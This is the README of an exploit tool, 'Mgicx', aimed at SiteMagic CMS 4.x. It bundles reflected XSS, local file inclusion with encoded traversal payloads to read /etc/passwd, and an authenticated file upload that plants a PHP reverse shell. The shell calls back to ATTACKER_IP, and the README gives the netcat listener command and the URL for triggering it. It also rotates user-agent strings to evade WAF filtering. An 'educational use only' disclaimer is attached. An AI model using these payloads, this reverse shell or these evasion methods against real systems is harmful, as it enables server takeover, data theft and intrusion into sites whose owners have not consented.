# Mgicx SiteMagic Exploitation Tool

**Author:** Byte Reaper  
**License:** For educational/research use only (unauthorized use is illegal and unethical).  

---

## Overview

**Mgicx** is a unified Proof-of-Concept tool targeting **SiteMagic CMS (4.x)**. It bundles three separate exploits into one binary:

1. **Cross-Site Scripting (XSS)**  
2. **Local File Inclusion (LFI)**  
3. **Authenticated File Upload → Reverse Shell**

Each exploit mode can be invoked independently via a command-line flag. The tool:
- Rotates through a list of common “User-Agent” strings to evade basic filtering or WAF.  
- Logs every request and outcome (with timestamps) to `MagicX.log`.  
- Prints concise success/failure messages to the console.

---

## Vulnerabilities Covered

1. **XSS (Reflected)**  
   - Injects JavaScript payloads into the `SMExt` parameter of a SiteMagic URL.  
   - Checks server response for direct reflection of each payload string.  
   - Supports a wide range of obfuscation vectors (inline HTML tags, event handlers, unicode escapes, etc.).

2. **LFI (Local File Inclusion)**  
   - Crafts multiple directory-traversal payloads (`../../../…/etc/passwd%00.png`) in different encodings:
     - Plain `../` + null-byte suffix
     - URL-encoded `%2F`
     - Double URL‐encoded `%252F`
     - Mixed forward/backslashes, etc.
   - Scans the response for the string `root:x:0:0` (the beginning of `/etc/passwd`) to confirm “success”.

3. **File Upload (Authenticated)**  
   - Targets the `SMFilesUpload` endpoint at:
    
     http://<target>/sitemagic/index.php
       ?SMExt=SMFiles
       &SMTemplateType=Basic
       &SMExecMode=Dedicated
       &SMFilesUpload
       &SMFilesUploadPath=files%2Fimages
     
   - Builds a `multipart/form-data` POST that uploads a PHP reverse-shell file named
     `php-reverse-shell.php` from the current working directory.
   - After upload completes, the reverse shell can be invoked via:
     
     http://<target>/sitemagic/files/images/php-reverse-shell.php
     
   - (You must create `php-reverse-shell.php` locally before running with a valid PHP payload.)

---

## Features

- **Single Binary** supports XSS, LFI, or File-Upload based on a switch (`-x`, `-f`, or `-p`).  
- **Rotating User-Agent**: Each HTTP request uses a new UA string from a large built-in list.  
- **Timestamped Logging**: Every attempt is appended to `MagicX.log` with `[YYYY-MM-DD HH:MM:SS] MESSAGE`.  
- **HTTP Status Code Check**: After each request, prints the response code and logs it.  
- **Minimal Dependencies**:  
  - [libcurl](https://curl.se/libcurl/) for all HTTP functionality  
  - [argparse.h](https://github.com/youtube/argparse) (single-header CLI parser)  

---

## Requirements

1. **Linux / macOS** (tested on Ubuntu 20.04, Kali Linux)  
2. **libcurl development headers** (e.g. `libcurl4-openssl-dev` on Debian/Ubuntu)  
3. **argparse.h** placed in the same folder (or in your include path).  
4. **GCC** (or compatible C compiler) with `-fno-pie -no-pie` flags allowed.  

---

## Build Instructions

sudo apt-get update
sudo apt-get install -y build-essential libcurl4-openssl-dev
# Make sure argparse.h is in this directory or under /usr/local/include
gcc Magicx.c -Wall -O2 -fno-pie -no-pie -lcurl -o Magicx
-Wall -O2: Enable warnings + optimize.

-fno-pie -no-pie: Build a non-position-independent executable.

Command-Line Usage
Usage: Magicx -u <target_url> [ -x | -f | -p ]
  -u, --url      Target base URL or SMExt prefix
  -x, --xss      Run XSS exploit
  -f, --lfi      Run LFI exploit
  -p, --upload   Run File-Upload exploit (Reverse Shell)
  -h, --help     Show this help message

XSS Exploit : 

./Magicx -u "http://victim.com/index.php?SMExt=" -x
The tool URL-encodes each payload, appends it to SMExt=, sends GET requests, and checks for reflection in the HTTP body.

LFI Exploit : 

./Magicx -u "http://victim.com" -f
The tool cycles through predefined traversal payloads, attempts to include /etc/passwd, and looks for "root:x:0:0" in the response.

File Upload : 

./Magicx -u "http://victim.com" -p
Precondition: Create a file named php-reverse-shell.php in the working directory:


<?php
  set_time_limit(0);
  $sock = fsockopen("ATTACKER_IP", 1234);
  exec("/bin/sh -i <&3 >&3 2>&3");
?>
Run the tool; it will:

Prompt you to ensure php-reverse-shell.php is present.

Upload the file to /sitemagic/files/images/.

Print the upload request’s HTTP code.

To activate the shell, in a separate terminal on your machine:

nc -lvnp 1234
Then visit:

http://victim.com/sitemagic/files/images/php-reverse-shell.php
You should get a root (or www-data) reverse shell.

Example Compile :

gcc Magicx.c -Wall -O2 -fno-pie -no-pie -lcurl -o Magicx
XSS Test

./Magicx -u "http://vulnweb.com/index.php?SMExt=" -x
# Output:
# [!] Testing payload "<script>alert(document.cookie);</script>"
# [!] Possible XSS with payload: "<script>alert(1)</script>"
LFI Test

./Magicx -u "http://vulnweb.com" -f
# Output:
# [+] Test Target URL : http://vulnweb.com/smcmsdemoint/index.php?SMTpl=../../../../etc/passwd%00.png
# [!] Possible LFI success detected in response!
File Upload

./Magicx -u "http://vulnweb.com" -p
# Prompts user to place php-reverse-shell.php
# [+] Full Target Url: http://vulnweb.com/sitemagic/index.php?SMExt=SMFiles&...{upload params}
# [+] HTTP response code: 200
Then point your web browser or curl to:

http://vulnweb.com/sitemagic/files/images/php-reverse-shell.php
On your Kali:

nc -lvnp 1234
# You receive the shell once the PHP is invoked.
Logging (MagicX.log)
Every action is appended to MagicX.log with a UTC timestamp:


[2023-07-15 14:22:07] [+] Welcome to the mgicX tool ...
[2023-07-15 14:22:07] [!] Possible XSS payload detected
[2023-07-15 14:22:09] [!] Possible LFI success detected
[2023-07-15 14:22:12] [+] Request sent successfully! (File Upload)
...
Success checks for XSS and LFI write a “Possible … success detected” line when the payload is reflected or /etc/passwd appears.

File Upload logs the HTTP response code (e.g., 200 OK).

Customization
Add/Remove Payloads

XSS payloads are hard-coded in the payloads[] array inside exploitXss().

LFI patterns are in payloads[] inside exploitLfi().

Feel free to append new vectors (e.g., additional encodings, Unicode bypasses).

User-Agent List

The sendAgents() function rotates through a large built-in list. You may replace or extend entries directly in the agents[] array.

Token & Endpoint Changes

If your SiteMagic installation uses a different SMRequestToken or upload path, modify the fileUploid() section accordingly:


// Example change: SMRequestToken from server’s HTML
curl_mime_data(field, "<new_token_here>", CURL_ZERO_TERMINATED);
Important Notes & Limitations
Authenticated Upload Required

The File-Upload exploit assumes you already have a valid authenticated session (cookie) for SiteMagic.

If the upload endpoint is protected by login, you must supply the session cookie via a curl_easy_setopt(curl, CURLOPT_COOKIE, "SMSESSION=…"); line.

Error Checking

The tool checks CURLcode and HTTP response codes, but does not parse full JSON/XML responses.

If SiteMagic’s upload endpoint changes parameters in future versions, file upload may fail.

Single-Shot

Each exploit (-x, -f, -p) must be run independently.

Combining flags (e.g., -x -f) is not supported—tool will pick the first valid exploit flag.

Testing Environment

Always test on a local/lab copy of SiteMagic CMS (4.x).

Attempting these exploits against live/production sites without permission is illegal.

Disclaimer
WARNING: This tool is provided for educational and research purposes only.
Unauthorized scanning, exploitation, or attacks against any systems without explicit permission is strictly prohibited and may lead to criminal charges. Always obtain proper authorization before using Mgicx.

